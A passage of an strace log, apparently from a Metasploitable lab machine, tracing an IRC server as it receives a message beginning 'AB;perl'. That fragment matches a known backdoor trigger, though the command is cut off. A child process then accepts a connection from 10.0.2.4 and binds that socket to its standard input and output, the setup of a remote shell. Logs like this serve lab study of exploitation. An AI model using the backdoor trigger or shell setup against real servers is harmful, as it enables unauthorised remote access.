5970  07:11:35.517399 exit_group(0)     = ?
5968  07:11:35.517400 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 5970
5968  07:11:35.517400 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5968  07:11:35.517434 --- SIGCHLD (Child exited) @ 0 (0) ---
5968  07:11:35.517443 waitpid(-1, 0xbfd638d8, WNOHANG) = -1 ECHILD (No child processes)
5968  07:11:35.517473 sigreturn()       = ? (mask now [])
5968  07:11:35.517507 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
5968  07:11:35.517551 exit_group(0)     = ?
4519  07:11:35.517590 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 5968
4519  07:11:35.517602 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:11:35.517621 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:11:35.517632 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:11:35.517641 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:11:35.517660 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:11:35.517724 time(NULL)        = 1495624295
4519  07:11:35.517735 time(NULL)        = 1495624295
4519  07:11:35.517801 gettimeofday({1495624295, 517806}, NULL) = 0
4519  07:11:35.517836 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:11:35.517923 clock_gettime(CLOCK_MONOTONIC, {1105, 334936886}) = 0
4519  07:11:35.517936 gettimeofday({1495624295, 517940}, NULL) = 0
4519  07:11:35.517947 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0} <unfinished ...>
5971  07:11:35.893178 <... accept resumed> {sa_family=AF_INET, sin_port=htons(37703), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
5971  07:11:35.893221 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eb278) = -1 EINVAL (Invalid argument)
5971  07:11:35.893237 _llseek(8, 0, 0xbf8eb2c0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5971  07:11:35.893249 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eb278) = -1 EINVAL (Invalid argument)
5971  07:11:35.893259 _llseek(8, 0, 0xbf8eb2c0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5971  07:11:35.893269 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
5971  07:11:35.893313 close(6)          = 0
5971  07:11:35.893452 dup(8)            = 6
5971  07:11:35.893467 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ec118) = -1 EINVAL (Invalid argument)
5971  07:11:35.893479 _llseek(6, 0, 0xbf8ec160, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5971  07:11:35.893490 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
5971  07:11:35.893523 dup2(6, 1)        = 1
5971  07:11:35.893535 close(6)          = 0
5971  07:11:35.893546 fcntl64(1, F_SETFD, 0) = 0
5971  07:11:35.893556 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ec0e8) = -1 EINVAL (Invalid argument)
5971  07:11:35.893566 _llseek(1, 0, 0xbf8ec130, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5971  07:11:35.893595 dup(8)            = 6
5971  07:11:35.893607 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ec118) = -1 EINVAL (Invalid argument)
5971  07:11:35.893617 _llseek(6, 0, 0xbf8ec160, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5971  07:11:35.893626 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
5971  07:11:35.893642 dup2(6, 0)        = 0
5971  07:11:35.893652 close(6)          = 0
5971  07:11:35.893662 fcntl64(0, F_SETFD, 0) = 0
5971  07:11:35.893674 fcntl64(0, F_SETFD, 0) = 0
5971  07:11:35.893689 read(0,  <unfinished ...>
4519  07:11:35.894466 <... select resumed> ) = 1 (in [5], left {0, 630000})
4519  07:11:35.894505 clock_gettime(CLOCK_MONOTONIC, {1105, 711518667}) = 0
4519  07:11:35.894519 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  07:11:35.894532 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  07:11:35.894553 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  07:11:35.894570 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  07:11:35.894614 close(5)          = 0
4519  07:11:35.894630 gettimeofday({1495624295, 894634}, NULL) = 0
4519  07:11:35.894642 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
